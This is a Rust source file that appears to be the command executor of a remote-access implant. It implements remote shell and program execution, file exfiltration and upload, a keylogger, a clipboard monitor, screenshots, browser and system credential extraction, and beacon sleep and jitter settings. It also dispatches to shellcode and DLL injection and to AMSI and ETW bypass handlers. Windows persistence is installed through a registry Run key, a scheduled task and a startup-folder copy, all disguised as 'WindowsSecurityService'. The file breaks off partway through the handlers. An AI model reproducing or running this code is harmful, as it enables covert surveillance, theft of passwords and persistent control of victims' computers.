use log::{info, error};
use std::process::Command;
use std::time::Instant;
use std::sync::{OnceLock, Arc};
use tokio::sync::RwLock;
use serde::{Deserialize, Serialize};
use base64::Engine;
use crate::keylogger::KeyLogger;

#[derive(Debug, Clone)]
pub struct BeaconConfig {
    pub sleep_ms: u64,
    pub jitter_pct: f64,
}

impl Default for BeaconConfig {
    fn default() -> Self {
        Self {
            sleep_ms: 10000,
            jitter_pct: 0.33,
        }
    }
}

static BEACON_CONFIG: OnceLock<Arc<RwLock<BeaconConfig>>> = OnceLock::new();

pub fn get_beacon_config() -> Arc<RwLock<BeaconConfig>> {
    BEACON_CONFIG.get_or_init(|| Arc::new(RwLock::new(BeaconConfig::default()))).clone()
}

static KEYLOGGER: OnceLock<KeyLogger> = OnceLock::new();

fn get_keylogger() -> &'static KeyLogger {
    KEYLOGGER.get_or_init(|| KeyLogger::new())
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ClipboardEntry {
    pub timestamp: String,
    pub content: String,
}

pub struct ClipboardMonitor {
    running: Arc<RwLock<bool>>,
    logs: Arc<RwLock<Vec<ClipboardEntry>>>,
}

impl ClipboardMonitor {
    pub fn new() -> Self {
        Self {
            running: Arc::new(RwLock::new(false)),
            logs: Arc::new(RwLock::new(Vec::new())),
        }
    }

    pub async fn start(&self) {
        let mut r = self.running.write().await;
        if *r {
            return;
        }
        *r = true;
        drop(r);

        let running = self.running.clone();
        let logs = self.logs.clone();
        tokio::spawn(async move {
            let mut last_content = String::new();
            loop {
                {
                    let r = running.read().await;
                    if !*r { break; }
                }
                if let Some(text) = read_clipboard_text() {
                    if text != last_content && !text.is_empty() {
                        last_content = text.clone();
                        let entry = ClipboardEntry {
                            timestamp: chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                            content: text,
                        };
                        let mut l = logs.write().await;
                        l.push(entry);
                        if l.len() > 500 {
                            l.remove(0);
                        }
                    }
                }
                tokio::time::sleep(std::time::Duration::from_secs(2)).await;
            }
        });
    }

    pub async fn stop(&self) {
        let mut r = self.running.write().await;
        *r = false;
    }

    pub async fn get_logs(&self) -> Vec<ClipboardEntry> {
        self.logs.read().await.clone()
    }
}

#[cfg(target_os = "windows")]
fn read_clipboard_text() -> Option<String> {
    unsafe {
        use winapi::um::winuser::{OpenClipboard, GetClipboardData, CloseClipboard, CF_TEXT};
        use std::ffi::CStr;
        if OpenClipboard(std::ptr::null_mut()) == 0 { return None; }
        let handle = GetClipboardData(CF_TEXT);
        let result = if handle.is_null() {
            None
        } else {
            let ptr = handle as *const i8;
            Some(CStr::from_ptr(ptr).to_string_lossy().into_owned())
        };
        CloseClipboard();
        result
    }
}

#[cfg(not(target_os = "windows"))]
fn read_clipboard_text() -> Option<String> {
    std::process::Command::new("xclip").args(["-selection", "clipboard", "-o"]).output().ok()
        .and_then(|o| if o.status.success() { String::from_utf8(o.stdout).ok() } else { None })
}

static CLIPBOARD_MONITOR: OnceLock<ClipboardMonitor> = OnceLock::new();

fn get_clipboard_monitor() -> &'static ClipboardMonitor {
    CLIPBOARD_MONITOR.get_or_init(|| ClipboardMonitor::new())
}

#[derive(Debug, Serialize, Deserialize, Clone)]
pub enum CommandType {
    #[serde(rename = "execute")]
    Execute { program: String, args: Vec<String> },

    #[serde(rename = "shell")]
    Shell { command: String },

    #[serde(rename = "whoami")]
    WhoAmI,

    #[serde(rename = "pwd")]
    Pwd,

    #[serde(rename = "ls")]
    ListDir { path: String },

    #[serde(rename = "cat")]
    ReadFile { path: String },

    #[serde(rename = "write")]
    WriteFile { path: String, content: String },

    #[serde(rename = "delete")]
    DeleteFile { path: String },

    #[serde(rename = "mkdir")]
    CreateDir { path: String },

    #[serde(rename = "systeminfo")]
    SystemInfo,

    #[serde(rename = "ps")]
    ProcessList,

    #[serde(rename = "kill")]
    KillProcess { pid: u32 },

    #[serde(rename = "ifconfig")]
    NetworkInfo,

    #[serde(rename = "sleep")]
    Sleep { seconds: u64 },

    #[serde(rename = "echo")]
    Echo { message: String },

    #[serde(rename = "screenshot")]
    Screenshot,

    #[serde(rename = "keylogger_start")]
    KeyloggerStart,

    #[serde(rename = "keylogger_stop")]
    KeyloggerStop,

    #[serde(rename = "keylogger_logs")]
    KeyloggerLogs,

    #[serde(rename = "keylogger_clear")]
    KeyloggerClear,

    #[serde(rename = "download")]
    Download { path: String },

    #[serde(rename = "upload")]
    Upload { path: String, data: String },

    #[serde(rename = "search_files")]
    SearchFiles { root: String, pattern: String, max_depth: Option<u32> },

    #[serde(rename = "persist_registry")]
    PersistRegistry,

    #[serde(rename = "persist_schtask")]
    PersistScheduledTask,

    #[serde(rename = "persist_startup")]
    PersistStartupFolder,

    #[serde(rename = "persist_remove")]
    PersistRemove,

    #[serde(rename = "credentials_browser")]
    CredentialsBrowser,

    #[serde(rename = "credentials_system")]
    CredentialsSystem,

    #[serde(rename = "credentials_all")]
    CredentialsAll,

    #[serde(rename = "config_beacon")]
    ConfigBeacon { sleep_ms: u64, jitter_pct: f64 },

    #[serde(rename = "clipboard_start")]
    ClipboardStart,

    #[serde(rename = "clipboard_stop")]
    ClipboardStop,

    #[serde(rename = "clipboard_logs")]
    ClipboardLogs,

    #[serde(rename = "inject_shellcode")]
    InjectShellcode { pid: u32, shellcode_b64: String },

    #[serde(rename = "inject_dll")]
    InjectDll { pid: u32, dll_path: String },

    #[serde(rename = "amsi_bypass")]
    AmsiBypass,

    #[serde(rename = "etw_bypass")]
    EtwBypass,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct CommandResult {
    pub command_type: String,
    pub status: String, // "success", "error", "timeout"
    pub output: String,
    pub error: Option<String>,
    pub execution_time_ms: u128,
}

pub struct Executor;

impl Executor {
    pub async fn execute_command(cmd: &CommandType) -> CommandResult {
        let start = Instant::now();

        let mut result = match cmd {
            CommandType::Execute { program, args } => {
                Self::execute_program(program, args).await
            }
            CommandType::Shell { command } => {
                Self::execute_shell_command(command).await
            }
            CommandType::WhoAmI => Self::whoami().await,
            CommandType::Pwd => Self::pwd().await,
            CommandType::ListDir { path } => Self::list_dir(path).await,
            CommandType::ReadFile { path } => Self::read_file(path).await,
            CommandType::WriteFile { path, content } => {
                Self::write_file(path, content).await
            }
            CommandType::DeleteFile { path } => Self::delete_file(path).await,
            CommandType::CreateDir { path } => Self::create_dir(path).await,
            CommandType::SystemInfo => Self::system_info().await,
            CommandType::ProcessList => Self::process_list().await,
            CommandType::KillProcess { pid } => Self::kill_process(*pid).await,
            CommandType::NetworkInfo => Self::network_info().await,
            CommandType::Sleep { seconds } => Self::sleep_command(*seconds).await,
            CommandType::Echo { message } => Self::echo(message).await,
            CommandType::Screenshot => Self::screenshot().await,
            CommandType::KeyloggerStart => Self::keylogger_start().await,
            CommandType::KeyloggerStop => Self::keylogger_stop().await,
            CommandType::KeyloggerLogs => Self::keylogger_logs().await,
            CommandType::KeyloggerClear => Self::keylogger_clear().await,
            CommandType::Download { path } => Self::download_file(path).await,
            CommandType::Upload { path, data } => Self::upload_file(path, data).await,
            CommandType::SearchFiles { root, pattern, max_depth } => {
                Self::search_files(root, pattern, *max_depth).await
            }
            CommandType::CredentialsBrowser => Self::credentials_browser().await,
            CommandType::CredentialsSystem => Self::credentials_system().await,
            CommandType::CredentialsAll => Self::credentials_all().await,
            CommandType::PersistRegistry | CommandType::PersistScheduledTask | CommandType::PersistStartupFolder => {
                Self::persist_install(cmd).await
            }
            CommandType::PersistRemove => Self::persist_remove().await,
            CommandType::ConfigBeacon { sleep_ms, jitter_pct } => {
                Self::config_beacon(*sleep_ms, *jitter_pct).await
            }
            CommandType::ClipboardStart => Self::clipboard_start().await,
            CommandType::ClipboardStop => Self::clipboard_stop().await,
            CommandType::ClipboardLogs => Self::clipboard_logs().await,
            CommandType::InjectShellcode { pid, shellcode_b64 } => Self::inject_shellcode(*pid, shellcode_b64).await,
            CommandType::InjectDll { pid, dll_path } => Self::inject_dll(*pid, dll_path).await,
            CommandType::AmsiBypass => Self::amsi_bypass().await,
            CommandType::EtwBypass => Self::etw_bypass().await,
        };

        result.execution_time_ms = start.elapsed().as_millis();
        result
    }

    async fn execute_program(
        program: &str,
        args: &[String],
    ) -> CommandResult {
        let start = Instant::now();

        info!("Executing program: {} with args: {:?}", program, args);

        match Command::new(program)
            .args(args)
            .output()
        {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                let stderr = String::from_utf8_lossy(&output.stderr).to_string();

                CommandResult {
                    command_type: "execute".to_string(),
                    status: if output.status.success() { "success" } else { "error" }
                        .to_string(),
                    output: stdout,
                    error: if stderr.is_empty() { None } else { Some(stderr) },
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
            Err(e) => {
                error!("Failed to execute {}: {}", program, e);
                CommandResult {
                    command_type: "execute".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
        }
    }

    async fn execute_shell_command(command: &str) -> CommandResult {
        let start = Instant::now();

        info!("Executing shell command: {}", command);

        let shell = if cfg!(target_os = "windows") { "cmd" } else { "sh" };
        let arg = if cfg!(target_os = "windows") { "/C" } else { "-c" };

        match Command::new(shell).arg(arg).arg(command).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                info!("Shell command output:\n{}", stdout);
                CommandResult {
                    command_type: "shell".to_string(),
                    status: "success".to_string(),
                    output: stdout,
                    error: None,
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
            Err(e) => {
                error!("Shell execution failed: {}", e);
                CommandResult {
                    command_type: "shell".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: start.elapsed().as_millis(),
                }
            }
        }
    }

    async fn whoami() -> CommandResult {
        let user = whoami::username();
        CommandResult {
            command_type: "whoami".to_string(),
            status: "success".to_string(),
            output: user,
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn pwd() -> CommandResult {
        match std::env::current_dir() {
            Ok(path) => CommandResult {
                command_type: "pwd".to_string(),
                status: "success".to_string(),
                output: path.display().to_string(),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "pwd".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn list_dir(path: &str) -> CommandResult {
        match std::fs::read_dir(path) {
            Ok(entries) => {
                let mut items: Vec<serde_json::Value> = Vec::new();
                for entry in entries.flatten() {
                    let meta = entry.metadata().ok();
                    let name = entry.file_name().to_string_lossy().to_string();
                    let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                    let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                    let modified = meta.as_ref()
                        .and_then(|m| m.modified().ok())
                        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                        .map(|d| d.as_secs())
                        .unwrap_or(0);
                    items.push(serde_json::json!({
                        "name": name,
                        "path": entry.path().to_string_lossy(),
                        "is_dir": is_dir,
                        "size": size,
                        "modified": modified,
                    }));
                }
                items.sort_by(|a, b| {
                    let a_dir = a["is_dir"].as_bool().unwrap_or(false);
                    let b_dir = b["is_dir"].as_bool().unwrap_or(false);
                    b_dir.cmp(&a_dir).then_with(|| {
                        a["name"].as_str().unwrap_or("").to_lowercase()
                            .cmp(&b["name"].as_str().unwrap_or("").to_lowercase())
                    })
                });
                CommandResult {
                    command_type: "ls".to_string(),
                    status: "success".to_string(),
                    output: serde_json::to_string(&items).unwrap_or_default(),
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => CommandResult {
                command_type: "ls".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn read_file(path: &str) -> CommandResult {
        match std::fs::read_to_string(path) {
            Ok(content) => CommandResult {
                command_type: "cat".to_string(),
                status: "success".to_string(),
                output: content,
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "cat".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn write_file(path: &str, content: &str) -> CommandResult {
        match std::fs::write(path, content) {
            Ok(_) => CommandResult {
                command_type: "write".to_string(),
                status: "success".to_string(),
                output: format!("File written to {}", path),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "write".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn delete_file(path: &str) -> CommandResult {
        match std::fs::remove_file(path) {
            Ok(_) => CommandResult {
                command_type: "delete".to_string(),
                status: "success".to_string(),
                output: format!("File deleted: {}", path),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "delete".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn create_dir(path: &str) -> CommandResult {
        match std::fs::create_dir_all(path) {
            Ok(_) => CommandResult {
                command_type: "mkdir".to_string(),
                status: "success".to_string(),
                output: format!("Directory created: {}", path),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "mkdir".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn system_info() -> CommandResult {
        use sysinfo::{System, SystemExt, CpuExt, DiskExt, ProcessExt};

        let mut sys = System::new_all();
        sys.refresh_all();

        let total_disk: u64 = sys.disks().iter().map(|d| d.total_space()).sum();
        let avail_disk: u64 = sys.disks().iter().map(|d| d.available_space()).sum();

        let info = serde_json::json!({
            "os": sys.name().unwrap_or_default(),
            "os_version": sys.os_version().unwrap_or_default(),
            "kernel": sys.kernel_version().unwrap_or_default(),
            "hostname": sys.host_name().unwrap_or_default(),
            "architecture": std::env::consts::ARCH,
            "cpu_count": sys.cpus().len(),
            "cpu_brand": sys.cpus().first().map(|c| c.brand().to_string()).unwrap_or_default(),
            "total_memory_mb": sys.total_memory() / (1024 * 1024),
            "used_memory_mb": sys.used_memory() / (1024 * 1024),
            "total_disk_gb": total_disk / (1024 * 1024 * 1024),
            "available_disk_gb": avail_disk / (1024 * 1024 * 1024),
            "uptime_minutes": sys.uptime() / 60,
            "process_count": sys.processes().len(),
        });

        CommandResult {
            command_type: "systeminfo".to_string(),
            status: "success".to_string(),
            output: serde_json::to_string_pretty(&info).unwrap_or_default(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn process_list() -> CommandResult {
        info!("Getting process list");
        use sysinfo::{System, SystemExt, ProcessExt, PidExt};

        let mut sys = System::new_all();
        sys.refresh_all();

        let mut procs: Vec<serde_json::Value> = Vec::new();
        for (pid, process) in sys.processes() {
            procs.push(serde_json::json!({
                "pid": pid.as_u32(),
                "name": process.name(),
                "cpu": format!("{:.1}", process.cpu_usage()),
                "memory_kb": process.memory() / 1024,
                "status": format!("{:?}", process.status()),
            }));
        }
        procs.sort_by(|a, b| {
            b["memory_kb"].as_u64().unwrap_or(0).cmp(&a["memory_kb"].as_u64().unwrap_or(0))
        });

        CommandResult {
            command_type: "ps".to_string(),
            status: "success".to_string(),
            output: serde_json::to_string(&procs).unwrap_or_default(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn kill_process(pid: u32) -> CommandResult {
        info!("Attempting to kill process: {}", pid);
        use sysinfo::{System, SystemExt, ProcessExt, Pid, PidExt};

        let mut sys = System::new_all();
        sys.refresh_all();
        let target = Pid::from(pid as usize);
        if let Some(process) = sys.process(target) {
            if process.kill() {
                CommandResult {
                    command_type: "kill".to_string(),
                    status: "success".to_string(),
                    output: format!("Process {} ({}) killed", pid, process.name()),
                    error: None,
                    execution_time_ms: 0,
                }
            } else {
                CommandResult {
                    command_type: "kill".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(format!("Failed to kill process {}", pid)),
                    execution_time_ms: 0,
                }
            }
        } else {
            CommandResult {
                command_type: "kill".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(format!("Process {} not found", pid)),
                execution_time_ms: 0,
            }
        }
    }

    async fn network_info() -> CommandResult {
        let (shell, arg, cmd) = if cfg!(target_os = "windows") {
            ("cmd", "/C", "ipconfig /all")
        } else {
            ("sh", "-c", "ip addr 2>/dev/null || ifconfig")
        };
        match Command::new(shell).arg(arg).arg(cmd).output() {
            Ok(output) => {
                let stdout = String::from_utf8_lossy(&output.stdout).to_string();
                CommandResult {
                    command_type: "ifconfig".to_string(),
                    status: "success".to_string(),
                    output: stdout,
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => CommandResult {
                command_type: "ifconfig".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn sleep_command(seconds: u64) -> CommandResult {
        let start = Instant::now();
        tokio::time::sleep(std::time::Duration::from_secs(seconds)).await;

        CommandResult {
            command_type: "sleep".to_string(),
            status: "success".to_string(),
            output: format!("Slept for {} seconds", seconds),
            error: None,
            execution_time_ms: start.elapsed().as_millis(),
        }
    }

    async fn echo(message: &str) -> CommandResult {
        CommandResult {
            command_type: "echo".to_string(),
            status: "success".to_string(),
            output: message.to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn screenshot() -> CommandResult {
        use crate::screenshot::ScreenCapture;

        match ScreenCapture::capture().await {
            Ok(data) => {
                let size = data.len();
                info!("📸 Screenshot captured: {} bytes", size);

                // Base64 encode for transmission
                let b64 = base64::engine::general_purpose::STANDARD.encode(&data);

                CommandResult {
                    command_type: "screenshot".to_string(),
                    status: "success".to_string(),
                    output: format!("data:image/jpeg;base64,{}", b64),
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => {
                error!("Screenshot capture failed: {}", e);
                CommandResult {
                    command_type: "screenshot".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: 0,
                }
            }
        }
    }

    async fn keylogger_start() -> CommandResult {
        let kl = get_keylogger();
        match kl.start().await {
            Ok(()) => CommandResult {
                command_type: "keylogger_start".to_string(),
                status: "success".to_string(),
                output: "Keylogger started".to_string(),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "keylogger_start".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e),
                execution_time_ms: 0,
            },
        }
    }

    async fn keylogger_stop() -> CommandResult {
        let kl = get_keylogger();
        match kl.stop().await {
            Ok(()) => CommandResult {
                command_type: "keylogger_stop".to_string(),
                status: "success".to_string(),
                output: "Keylogger stopped".to_string(),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "keylogger_stop".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e),
                execution_time_ms: 0,
            },
        }
    }

    async fn keylogger_logs() -> CommandResult {
        let kl = get_keylogger();
        match kl.get_logs_json().await {
            Ok(json) => CommandResult {
                command_type: "keylogger_logs".to_string(),
                status: "success".to_string(),
                output: json,
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "keylogger_logs".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e),
                execution_time_ms: 0,
            },
        }
    }

    async fn keylogger_clear() -> CommandResult {
        let kl = get_keylogger();
        match kl.clear_logs().await {
            Ok(count) => CommandResult {
                command_type: "keylogger_clear".to_string(),
                status: "success".to_string(),
                output: format!("Cleared {} entries", count),
                error: None,
                execution_time_ms: 0,
            },
            Err(e) => CommandResult {
                command_type: "keylogger_clear".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e),
                execution_time_ms: 0,
            },
        }
    }

    async fn download_file(path: &str) -> CommandResult {
        const MAX_SIZE: u64 = 10 * 1024 * 1024; // 10MB limit

        match std::fs::metadata(path) {
            Ok(meta) => {
                if meta.len() > MAX_SIZE {
                    return CommandResult {
                        command_type: "download".to_string(),
                        status: "error".to_string(),
                        output: String::new(),
                        error: Some(format!("File too large: {} bytes (max {}MB)", meta.len(), MAX_SIZE / 1024 / 1024)),
                        execution_time_ms: 0,
                    };
                }
                match std::fs::read(path) {
                    Ok(data) => {
                        let filename = std::path::Path::new(path)
                            .file_name()
                            .map(|n| n.to_string_lossy().to_string())
                            .unwrap_or_else(|| "file".to_string());
                        let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
                        let output = serde_json::json!({
                            "filename": filename,
                            "size": data.len(),
                            "data": b64,
                        });
                        CommandResult {
                            command_type: "download".to_string(),
                            status: "success".to_string(),
                            output: output.to_string(),
                            error: None,
                            execution_time_ms: 0,
                        }
                    }
                    Err(e) => CommandResult {
                        command_type: "download".to_string(),
                        status: "error".to_string(),
                        output: String::new(),
                        error: Some(e.to_string()),
                        execution_time_ms: 0,
                    },
                }
            }
            Err(e) => CommandResult {
                command_type: "download".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(e.to_string()),
                execution_time_ms: 0,
            },
        }
    }

    async fn upload_file(path: &str, data: &str) -> CommandResult {
        match base64::engine::general_purpose::STANDARD.decode(data) {
            Ok(bytes) => {
                // Ensure parent directory exists
                if let Some(parent) = std::path::Path::new(path).parent() {
                    let _ = std::fs::create_dir_all(parent);
                }
                match std::fs::write(path, &bytes) {
                    Ok(_) => CommandResult {
                        command_type: "upload".to_string(),
                        status: "success".to_string(),
                        output: format!("File uploaded: {} ({} bytes)", path, bytes.len()),
                        error: None,
                        execution_time_ms: 0,
                    },
                    Err(e) => CommandResult {
                        command_type: "upload".to_string(),
                        status: "error".to_string(),
                        output: String::new(),
                        error: Some(e.to_string()),
                        execution_time_ms: 0,
                    },
                }
            }
            Err(e) => CommandResult {
                command_type: "upload".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some(format!("Base64 decode error: {}", e)),
                execution_time_ms: 0,
            },
        }
    }

    async fn search_files(root: &str, pattern: &str, max_depth: Option<u32>) -> CommandResult {
        let max_depth = max_depth.unwrap_or(5) as usize;
        let pattern_lower = pattern.to_lowercase();
        let mut results: Vec<serde_json::Value> = Vec::new();
        let max_results = 200;

        fn walk(dir: &std::path::Path, pattern: &str, depth: usize, max_depth: usize, results: &mut Vec<serde_json::Value>, max_results: usize) {
            if depth > max_depth || results.len() >= max_results { return; }
            if let Ok(entries) = std::fs::read_dir(dir) {
                for entry in entries.flatten() {
                    if results.len() >= max_results { return; }
                    let name = entry.file_name().to_string_lossy().to_string();
                    if name.to_lowercase().contains(pattern) {
                        let meta = entry.metadata().ok();
                        let is_dir = meta.as_ref().map(|m| m.is_dir()).unwrap_or(false);
                        let size = meta.as_ref().map(|m| m.len()).unwrap_or(0);
                        results.push(serde_json::json!({
                            "name": name,
                            "path": entry.path().to_string_lossy(),
                            "is_dir": is_dir,
                            "size": size,
                        }));
                    }
                    if entry.metadata().map(|m| m.is_dir()).unwrap_or(false) {
                        walk(&entry.path(), pattern, depth + 1, max_depth, results, max_results);
                    }
                }
            }
        }

        walk(std::path::Path::new(root), &pattern_lower, 0, max_depth, &mut results, max_results);

        CommandResult {
            command_type: "search_files".to_string(),
            status: "success".to_string(),
            output: serde_json::to_string(&results).unwrap_or_default(),
            error: None,
            execution_time_ms: 0,
        }
    }

    pub async fn credentials_browser() -> CommandResult {
        use crate::credentials::CredentialManager;

        info!("📋 Extracting browser credentials...");

        match tokio::task::spawn_blocking(|| {
            let rt = tokio::runtime::Runtime::new().unwrap();
            rt.block_on(async {
                CredentialManager::extract_browser_credentials().await
            })
        }).await {
            Ok(Ok(creds)) => {
                let formatted = CredentialManager::format_for_transmission(&creds);
                CommandResult {
                    command_type: "credentials_browser".to_string(),
                    status: "success".to_string(),
                    output: formatted,
                    error: None,
                    execution_time_ms: 0,
                }
            }
            _ => {
                CommandResult {
                    command_type: "credentials_browser".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some("Failed to extract browser credentials".to_string()),
                    execution_time_ms: 0,
                }
            }
        }
    }

    async fn credentials_system() -> CommandResult {
        use crate::credentials::CredentialManager;

        info!("🔑 Extracting system credentials...");

        match CredentialManager::extract_system_passwords().await {
            Ok(creds) => {
                let formatted = CredentialManager::format_for_transmission(&creds);
                CommandResult {
                    command_type: "credentials_system".to_string(),
                    status: "success".to_string(),
                    output: formatted,
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => {
                CommandResult {
                    command_type: "credentials_system".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e),
                    execution_time_ms: 0,
                }
            }
        }
    }

    async fn credentials_all() -> CommandResult {
        use crate::credentials::CredentialManager;

        info!("🔑 Extracting all credentials (browser + system)...");

        match CredentialManager::get_all_credentials().await {
            Ok(creds) => {
                let stats = CredentialManager::get_statistics(&creds);
                let formatted = CredentialManager::format_for_transmission(&creds);

                let mut output = String::from("=== CREDENTIAL EXTRACTION SUMMARY ===\n");
                output.push_str(&format!("Total Credentials: {}\n\n", creds.len()));
                output.push_str("Breakdown by Source:\n");
                for (source, count) in stats {
                    output.push_str(&format!("  • {}: {}\n", source, count));
                }
                output.push_str("\n");
                output.push_str(&formatted);

                CommandResult {
                    command_type: "credentials_all".to_string(),
                    status: "success".to_string(),
                    output,
                    error: None,
                    execution_time_ms: 0,
                }
            }
            Err(e) => {
                CommandResult {
                    command_type: "credentials_all".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e),
                    execution_time_ms: 0,
                }
            }
        }
    }

    async fn config_beacon(sleep_ms: u64, jitter_pct: f64) -> CommandResult {
        let config = get_beacon_config();
        let mut cfg = config.write().await;
        let old_sleep = cfg.sleep_ms;
        let old_jitter = cfg.jitter_pct;
        cfg.sleep_ms = sleep_ms.max(1000); // min 1 second
        cfg.jitter_pct = jitter_pct.clamp(0.0, 0.9);
        info!("Beacon config updated: sleep {}ms→{}ms, jitter {:.0}%→{:.0}%",
            old_sleep, cfg.sleep_ms, old_jitter * 100.0, cfg.jitter_pct * 100.0);
        CommandResult {
            command_type: "config_beacon".to_string(),
            status: "success".to_string(),
            output: format!("Beacon config updated: sleep={}ms, jitter={:.0}%", cfg.sleep_ms, cfg.jitter_pct * 100.0),
            error: None,
            execution_time_ms: 0,
        }
    }

    async fn persist_install(_cmd: &CommandType) -> CommandResult {
        #[cfg(target_os = "windows")]
        {
            use std::env;
            let exe_path = env::current_exe().unwrap_or_default();
            let exe_str = exe_path.to_string_lossy();

            let (method_name, result) = match _cmd {
                CommandType::PersistRegistry => {
                    let output = Command::new("reg")
                        .args(["add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                               "/v", "WindowsSecurityService", "/t", "REG_SZ",
                               "/d", &exe_str, "/f"])
                        .output();
                    ("registry", output)
                }
                CommandType::PersistScheduledTask => {
                    let output = Command::new("schtasks")
                        .args(["/Create", "/SC", "ONLOGON", "/TN", "WindowsSecurityService",
                               "/TR", &exe_str, "/F"])
                        .output();
                    ("scheduled_task", output)
                }
                CommandType::PersistStartupFolder => {
                    let startup = dirs::home_dir()
                        .map(|h| h.join(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"))
                        .unwrap_or_default();
                    let dest = startup.join("SecurityService.exe");
                    let result = std::fs::copy(&exe_path, &dest);
                    return CommandResult {
                        command_type: "persist_startup".to_string(),
                        status: if result.is_ok() { "success" } else { "error" }.to_string(),
                        output: format!("Copied to {:?}", dest),
                        error: result.err().map(|e| e.to_string()),
                        execution_time_ms: 0,
                    };
                }
                _ => return CommandResult {
                    command_type: "persist".to_string(),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some("Unknown persist method".to_string()),
                    execution_time_ms: 0,
                },
            };

            match result {
                Ok(out) => CommandResult {
                    command_type: format!("persist_{}", method_name),
                    status: if out.status.success() { "success" } else { "error" }.to_string(),
                    output: String::from_utf8_lossy(&out.stdout).to_string(),
                    error: if out.status.success() { None } else { Some(String::from_utf8_lossy(&out.stderr).to_string()) },
                    execution_time_ms: 0,
                },
                Err(e) => CommandResult {
                    command_type: format!("persist_{}", method_name),
                    status: "error".to_string(),
                    output: String::new(),
                    error: Some(e.to_string()),
                    execution_time_ms: 0,
                },
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            CommandResult {
                command_type: "persist".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some("Persistence only supported on Windows".to_string()),
                execution_time_ms: 0,
            }
        }
    }

    async fn persist_remove() -> CommandResult {
        #[cfg(target_os = "windows")]
        {
            // Remove all persistence methods
            let _ = Command::new("reg")
                .args(["delete", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                       "/v", "WindowsSecurityService", "/f"])
                .output();
            let _ = Command::new("schtasks")
                .args(["/Delete", "/TN", "WindowsSecurityService", "/F"])
                .output();
            if let Some(startup) = dirs::home_dir() {
                let dest = startup.join(r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\SecurityService.exe");
                let _ = std::fs::remove_file(dest);
            }
            CommandResult {
                command_type: "persist_remove".to_string(),
                status: "success".to_string(),
                output: "All persistence methods removed".to_string(),
                error: None,
                execution_time_ms: 0,
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            CommandResult {
                command_type: "persist_remove".to_string(),
                status: "error".to_string(),
                output: String::new(),
                error: Some("Persistence only supported on Windows".to_string()),
                execution_time_ms: 0,
            }
        }
    }

    async fn clipboard_start() -> CommandResult {
        let monitor = get_clipboard_monitor();
        monitor.start().await;
        CommandResult {
            command_type: "clipboard_start".to_string(),
            status: "success".to_string(),
            output: "Clipboard monitoring started (polling every 2s)".to_string(),
            error: None,
            execution_time_ms: 0,
        }
    }

